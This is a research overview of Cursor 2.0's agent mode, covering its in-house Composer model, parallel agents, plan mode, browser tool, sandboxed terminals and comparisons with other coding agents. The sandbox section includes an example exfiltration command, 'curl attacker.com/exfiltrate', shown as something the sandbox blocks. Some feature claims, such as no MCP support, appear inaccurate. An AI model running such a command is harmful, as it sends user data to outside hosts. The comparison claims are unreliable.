# Cursor AI Editor — Agent Mode Deep Dive

> Research compiled: March 2026  
> Sources: cursor.com, cursor.com/changelog/2-0, cometapi.com analysis, Cursor docs

---

## Table of Contents

1. [Overview](#overview)
2. [Cursor 2.0 — The Agent-First Relaunch](#cursor-20--the-agent-first-relaunch)
3. [Architecture: Composer & Agent Core](#architecture-composer--agent-core)
4. [Agentic Flow](#agentic-flow)
5. [Autonomy Slider: Tab → Cmd+K → Agent](#autonomy-slider-tab--cmdk--agent)
6. [Tool Use in Agent Mode](#tool-use-in-agent-mode)
7. [Context Management](#context-management)
8. [Multi-Agent Orchestration](#multi-agent-orchestration)
9. [Plan Mode](#plan-mode)
10. [Browser Integration (GA)](#browser-integration-ga)
11. [Sandboxed Terminals](#sandboxed-terminals)
12. [Model Configuration](#model-configuration)
13. [Workspace & Project Context](#workspace--project-context)
14. [Enterprise Features](#enterprise-features)
15. [Cursor vs. Agent Mode in VS Code Copilot](#cursor-vs-agent-mode-in-vs-code-copilot)
16. [Comparison with Other Harnesses](#comparison-with-other-harnesses)
17. [Sources](#sources)

---

## Overview

Cursor is an AI-first code editor (fork of VS Code) designed from the ground up to integrate AI agents as first-class collaborators in the coding workflow. Unlike extensions bolted onto existing editors, Cursor rebuilds the editor experience around AI — with agents, tool integrations (terminals, browser, semantic search), and model-centric workflows.

**Cursor 2.0** (released October 29, 2025) is a major pivot: Cursor shipped its own **purpose-built coding model (Composer)**, a reimagined multi-agent UI, parallel agent execution, and production-ready sandboxed terminals. This release repositioned Cursor from "an editor with AI features" to "a full-stack platform for agent-centric software engineering."

### Key Facts

- **Type**: Full IDE (VS Code fork) + agent platform
- **License**: Proprietary (commercial)
- **Pricing**: Free Hobby plan + paid Pro/Business
- **Primary model**: Composer (in-house) + Claude/GPT/Gemini
- **Platform**: macOS, Windows, Linux
- **Website**: cursor.com

---

## Cursor 2.0 — The Agent-First Relaunch

Cursor 2.0 is built around three interlocking ideas:

### 1. Agent-First Editor Design

Cursor 2.0 treats agents as **managed objects** in the editor:
- Agents visible in a sidebar as named, manageable processes
- Each agent has its own logs, inputs, and outputs
- Agents execute **plans** (multi-step strategies) against the repo
- Plans can be inspected, paused, and reviewed before/during execution

This reframes AI actions from "chat responses" to "orchestratable tasks" — each with inputs, logs, and outputs that engineers can audit.

### 2. Composer — Purpose-Built Coding Model

Cursor's first in-house model, **Composer**, is trained and optimized specifically for:
- Agentic interactions inside the Cursor environment
- Multi-step coding workflows (plan → edit → test → iterate)
- Speed: ~4× faster than similarly capable general models
- Most turns complete in under 30 seconds

**Training approach:**
- Trained with access to codebase tools *during training* (semantic search, edit runners)
- Optimized with reinforcement learning (RL) for fast, reliable code changes
- Architecture: Likely MoE (Mixture-of-Experts) based on coverage of training recipe
- Understands tool use patterns from the Cursor environment natively

### 3. Parallel, Isolated Agent Execution

Up to **8 agents run in parallel** on the same project:
- Each agent operates in an **isolated copy** of the codebase
- Isolation via git worktrees (local) or remote worker sandboxes
- No file conflicts between parallel agents
- Enables "what if" exploration: run 8 different fix strategies, compare results

---

## Architecture: Composer & Agent Core

### Cursor's Tech Stack

Cursor is built as a VS Code fork with deep modifications:
- Extended extension API for agent orchestration
- Custom model routing layer for Composer
- Agent runtime managing process isolation and communication
- Plan management UI components

### Composer Model Architecture

```
User prompt → Composer model
              ├── Semantic search (understands codebase)
              ├── Edit generation (proposes file changes)
              ├── Test runner integration
              └── Iterative refinement

Agent outputs:
├── File diff proposals
├── Terminal commands (sandboxed)
├── Plan documents
└── Assistant messages
```

### Agent Runtime

The agent runtime manages:
- **Worktree isolation**: Each agent gets its own git worktree or cloud sandbox
- **Plan execution**: Breaking down high-level goals into executable steps
- **Tool dispatch**: Routing tool calls to appropriate handlers
- **Result aggregation**: Collecting and presenting agent outputs

---

## Agentic Flow

### How Agent Mode Works

1. **User sends a prompt** to Composer/Agent
2. **Model builds a plan** (optional, configurable)
3. **Model identifies files** to read using semantic search
4. **Model generates edits** across multiple files
5. **Terminal commands proposed** (with sandboxed execution)
6. **Model monitors output** — compile errors, test failures
7. **Iterates to fix issues** found in step 6
8. **Presents result** to user for review

### Iteration Pattern

```
User: "Add comprehensive error handling to the API module"

Agent turn 1:
  → Semantic search: find all API route handlers
  → Read: routes/auth.ts, routes/users.ts, routes/posts.ts
  → Plan: Add try/catch to each handler, map error types to HTTP codes

Agent turn 2:
  → Edit: routes/auth.ts (add try/catch blocks)
  → Edit: routes/users.ts (add try/catch blocks)
  → Edit: routes/posts.ts (add try/catch blocks)
  → Run: npx tsc --noEmit (check for TypeScript errors)
  → Found: 2 type errors in error handling code

Agent turn 3:
  → Fix type errors (union types for error handling)
  → Run: npx tsc --noEmit (now clean)
  → Done: "Added error handling to 3 API route files..."
```

### Interrupt & Steer

Users can interrupt at any point:
- Type a new message to redirect
- Use `Undo Last Edit` button to revert most recent change
- Full undo support for granular rollback

---

## Autonomy Slider: Tab → Cmd+K → Agent

Cursor explicitly models AI assistance as a **spectrum of autonomy**:

```
Low autonomy ←────────────────────────────────────→ High autonomy
     │                    │                              │
   Tab                  Cmd+K                          Agent
(completion)       (targeted edit)              (full autonomy)
```

### 1. Tab Completion

- AI suggests the next token/line/block
- User accepts with Tab
- Zero explicit prompting
- Fastest, most inline

### 2. Cmd+K (Targeted Edit)

- User selects code + writes instruction
- AI makes a specific, scoped edit
- Review inline diff, accept/reject
- Good for: "change this function to be async"

### 3. Agent Mode (Full Autonomy)

- User describes high-level task
- AI autonomously finds relevant files
- Makes multi-file changes
- Runs commands, fixes errors
- Good for: "Add user authentication to this app"

This spectrum is a deliberate design choice — developers choose how much autonomy to give the AI based on task complexity and risk tolerance.

---

## Tool Use in Agent Mode

Cursor agent mode uses a rich tool set to accomplish tasks:

### File Tools

| Tool | Description |
|------|-------------|
| **Semantic search** | Find code by meaning, not just text match |
| **File read** | Read full file contents |
| **File edit** | Apply targeted changes to files |
| **File create** | Create new files |
| **Directory listing** | Explore project structure |
| **Glob/regex search** | Pattern-based file finding |

### Execution Tools

| Tool | Description |
|------|-------------|
| **Terminal** | Run shell commands (sandboxed in 2.0) |
| **Test runner** | Execute test suites |
| **Build runner** | Run build processes |

### Intelligence Tools

| Tool | Description |
|------|-------------|
| **Browser** | Interact with web pages, extract DOM (GA in 2.0) |
| **LSP integration** | Get compile/lint errors from VS Code language services |
| **Code navigation** | Jump to definitions, find references |

### Tool Transparency

Every tool invocation is **transparently displayed in the UI**:
- User sees what the agent is doing in real time
- Terminal commands shown before execution
- File diffs presented for review

---

## Context Management

### Automatic Context Detection

Agent mode automatically finds relevant context:
- **Summarized workspace structure** included in every prompt (not full codebase)
- **Semantic search** used to find relevant files dynamically
- Agent assembles a working set of files as it explores

### Manual Context Addition

```
@file:src/auth.ts     — Add specific file
@folder:src/api/      — Add entire folder
@url:https://...      — Fetch URL content as context
#file:src/auth.ts     — Drag-and-drop or button
```

### AGENTS.md / Project Instructions

Cursor supports project-level instruction files:
- `.cursorrules` — Legacy project rules file
- `AGENTS.md` — Project context for AI agents (newer standard)

These files are loaded at agent session start to provide:
- Coding conventions
- Project architecture notes
- Preferred libraries and patterns

### Context Window Strategy

Cursor uses a multi-tiered context approach:
1. **Summarized project structure** (always present, token-efficient)
2. **Dynamically fetched file contents** (loaded on demand via semantic search)
3. **Tool call results** (accumulated during session)
4. **Conversation history** (up to context limit)

Unlike Aider's static repo map, Cursor's semantic search is **dynamic** — it can discover relevant files mid-session based on what it learns.

---

## Multi-Agent Orchestration

### Cursor 2.0 Multi-Agent Features

**Parallel execution:**
- Up to 8 agents simultaneously
- Each in isolated git worktree or cloud sandbox
- Sidebar shows all active agents with status
- Compare results without conflicts

**Plan management:**
- Create named plans ("Add authentication", "Fix performance")
- Plans have explicit steps that can be reviewed
- Execute plans in foreground or background

**Plan Mode:**
1. Create plan with one model (strong reasoner)
2. Review and refine the plan
3. Execute with another model (fast executor)

### Agent Sidebar

The new Agent Sidebar in Cursor 2.0:
```
┌─ Agents ──────────────────────┐
│ ● auth-feature (running)       │
│   Step 3/7: Adding JWT tokens  │
│                                │
│ ✓ bug-fix-107 (done)          │
│   Fixed null pointer in user   │
│                                │
│ ● perf-opt (running)           │
│   Step 1/4: Profiling API...   │
│                                │
│ [+ New Agent]                  │
└────────────────────────────────┘
```

### Background Agents

Agents can run in the background while developers work on other tasks:
- Cloud agents: 99.9% reliability, faster startup
- Background visibility in sidebar
- Notifications when done or when input needed

---

## Plan Mode

Plan Mode separates **thinking** from **acting**:

### Plan Mode Workflow

1. **Create plan**: User describes high-level goal
2. **Model plans**: Agent analyzes codebase, proposes step-by-step approach
3. **Review**: User reads the plan, adds comments, modifies steps
4. **Execute**: Agent follows the reviewed plan to make changes

### Plan Format

```markdown
# Plan: Add OAuth Authentication

## Analysis
Current auth uses username/password. Need to add Google OAuth.

## Steps

1. Install dependencies: passport, passport-google-oauth20
2. Create OAuth callback route in src/routes/auth.ts
3. Add Google credentials to environment config
4. Update frontend login page with Google Sign-In button
5. Add user profile sync from OAuth token
6. Write integration tests for OAuth flow

## Files to modify
- src/routes/auth.ts
- src/config/env.ts
- frontend/components/LoginPage.tsx
- tests/integration/auth.test.ts
```

User reviews and approves before execution begins.

---

## Browser Integration (GA)

Cursor 2.0 ships the **browser tool** as generally available:

### Capabilities

- Navigate to URLs
- Interact with DOM elements (click, type, scroll)
- Capture screenshots
- Extract structured data from pages
- Forward console logs to agent

### Use Cases

```
"Test the checkout flow and report any errors"
→ Agent opens localhost:3000
→ Navigates to /checkout
→ Fills in test data
→ Captures screenshot of error
→ Reads console logs
→ Reports: "Payment form crashes on empty card number"

"Check the docs for the new API endpoint format"
→ Agent opens docs.stripe.com/api
→ Extracts relevant endpoint format
→ Updates implementation to match
```

### Browser + Edit Loop

```
Agent reads DOM → Identifies bug → Edits code → Re-runs browser → Verifies fix
```

---

## Sandboxed Terminals (GA on macOS)

Cursor 2.0 ships sandboxed terminal execution as GA on macOS:

### Sandbox Properties

- Filesystem: Read/write access to workspace only
- Network: Blocked by default
- Allowlist: Specific commands can be whitelisted for network
- Admin controls: Enterprise-configurable policies

### Command Execution Flow

```
Agent wants to run: "npm run build"

1. Sandbox checks: Is "npm run build" in allowlist?
2. If allowed: Execute in sandbox, capture output
3. Agent receives stdout/stderr
4. Agent can react to errors

Agent wants to run: "curl attacker.com/exfiltrate"

1. Sandbox checks: Is curl to external domain allowed?
2. Blocked: Network access denied
3. Agent informed of constraint
```

### Why Sandboxing Matters

As agents make more autonomous decisions about what commands to run, sandboxing becomes critical:
- Prevents accidental/malicious data exfiltration
- Limits blast radius of agent mistakes
- Enables safer full-auto agent execution

---

## Model Configuration

### Available Models in Cursor

Cursor supports multiple model providers:

**In-house:**
- Composer — purpose-built fast coding model

**Anthropic:**
- Claude Sonnet 3.5 / 3.7
- Claude Opus (via Plan mode)

**OpenAI:**
- GPT-4o / GPT-4o mini
- o1 / o3 / o4-mini

**Google:**
- Gemini 2.5 Pro / Flash

**Custom:**
- Any OpenAI-compatible API (CometAPI, etc.)

### Model Selection Strategy

Cursor's recommended approach:
- **Composer**: Default for most agentic tasks (fastest)
- **Opus / o1 / o3**: For planning and complex architectural decisions
- **GPT-4o / Sonnet**: For balanced quality/speed

### API Key Configuration

```
Cursor Settings → Models → API Keys

OpenAI: sk-...
Anthropic: sk-ant-...
Google: AI...
Custom Base URL: https://api.custom.com/v1
```

---

## Workspace & Project Context

### .cursorrules (Legacy)

```
# .cursorrules
You are an expert TypeScript developer.
Always use strict TypeScript.
Prefer functional patterns over classes.
Use Zod for validation.
Write tests for all new functions.
```

### AGENTS.md (Current Standard)

```markdown
# Project: MyApp API

## Tech Stack
- Node.js + Express + TypeScript
- PostgreSQL + Prisma ORM
- Jest for testing

## Conventions
- Use async/await (never callbacks)
- Error handling: always use Result<T, E> pattern
- Logging: use pino logger, never console.log

## Testing
- Run: npm test
- Test files: *.test.ts adjacent to implementation
```

### Workspace Indexing

Cursor indexes the workspace for semantic search:
- Builds vector embeddings of code
- Enables "find code by meaning"
- Updates incrementally as files change
- Used by agent mode to discover relevant context without explicit `@file` references

---

## Enterprise Features

### Team & Business Plans

**Centralized billing:**
- Per-seat pricing
- Usage dashboards
- Team spending limits

**Privacy modes:**
- Privacy mode: No code sent to Cursor servers
- Local inference option (for sensitive codebases)

**Admin controls:**
- Allowlist/denylist terminal commands for agents
- Configure approved model providers
- Audit logs for agent activity

### Cursor for Teams

- Shared cursor rules (team-wide conventions)
- Shared custom agents
- Consistent AI behavior across team

---

## Cursor vs. Agent Mode in VS Code Copilot

| Feature | Cursor Agent Mode | Copilot Agent Mode (VS Code) |
|---------|------------------|-------------------------------|
| **Editor base** | VS Code fork | VS Code extension |
| **In-house model** | ✅ Composer | ❌ (uses OpenAI/Anthropic) |
| **Multi-agent** | ✅ Up to 8 parallel | ❌ Single agent |
| **Sandboxed terminal** | ✅ GA on macOS | ❌ |
| **Browser** | ✅ GA | ❌ |
| **Plan mode** | ✅ Native | Limited |
| **Workspace index** | ✅ Vector embeddings | ✅ (summarized structure) |
| **Pricing** | Paid subscription | Free with GitHub Copilot |
| **Open source** | ❌ | VS Code is open source |
| **Latency** | ✅ ~30s turns (Composer) | Depends on model |

---

## Comparison with Other Harnesses

| Feature | Cursor | Claude Code | OpenCode | Aider | Cline |
|---------|--------|-------------|----------|-------|-------|
| **Interface** | IDE (VS Code fork) | Terminal + IDE | Terminal TUI | Terminal | VS Code ext |
| **Open Source** | ❌ | ❌ | ✅ MIT | ✅ | ✅ |
| **In-house model** | ✅ Composer | ❌ | ❌ | ❌ | ❌ |
| **Multi-agent** | ✅ 8 parallel | ✅ Subagents | ✅ Multi-session | ❌ | ❌ |
| **Browser** | ✅ GA | ✅ Chrome | ❌ | ❌ | ✅ |
| **Sandboxed terminal** | ✅ (macOS) | ✅ (optional) | ❌ | ❌ | ❌ |
| **Semantic search** | ✅ Vector index | ✅ (tools) | ✅ Sourcegraph | ✅ Repo map | ✅ |
| **MCP support** | ❌ | ✅ | ✅ | ❌ | ✅ |
| **Git integration** | ✅ | ✅ | Limited | ✅ Deep | ✅ |
| **Plan mode** | ✅ Native | ✅ | ✅ | ✅ (architect) | ❌ |
| **Cloud agents** | ✅ | ✅ | ❌ | ❌ | ❌ |

### Cursor's Unique Advantages

1. **Composer model**: The only major coding agent with a purpose-built in-house model optimized end-to-end for the agentic coding workflow
2. **4× speed**: Sub-30-second turns make the edit loop feel interactive rather than batched
3. **True parallel agents**: 8 concurrent agents with file isolation — not available in any other tool
4. **Full IDE integration**: Tab completion + targeted edits + full agent in one tool, all from same interface
5. **Production sandboxing**: GA sandboxed terminals with network isolation

### Cursor's Limitations

1. **Not open source**: No ability to self-host or audit the model
2. **No MCP support**: Cannot extend with external tool servers
3. **macOS sandbox only**: Windows/Linux don't have sandboxed terminals yet
4. **Vendor lock-in**: Composer model only available in Cursor

---

## Sources

1. [Cursor Official Website](https://cursor.com/)
2. [Cursor 2.0 Changelog](https://cursor.com/changelog/2-0)
3. [Cursor 2.0 & Composer Analysis](https://www.cometapi.com/cursor-2-0-what-changed-and-why-it-matters/)
4. [Cursor Features Page](https://cursor.com/features)
5. [Cursor 2.0 Ultimate Guide 2025](https://skywork.ai/blog/vibecoding/cursor-2-0-ultimate-guide-2025-ai-code-editing/)
6. Cursor official changelog and blog posts (October 2025)

---

*Last updated: March 2026*
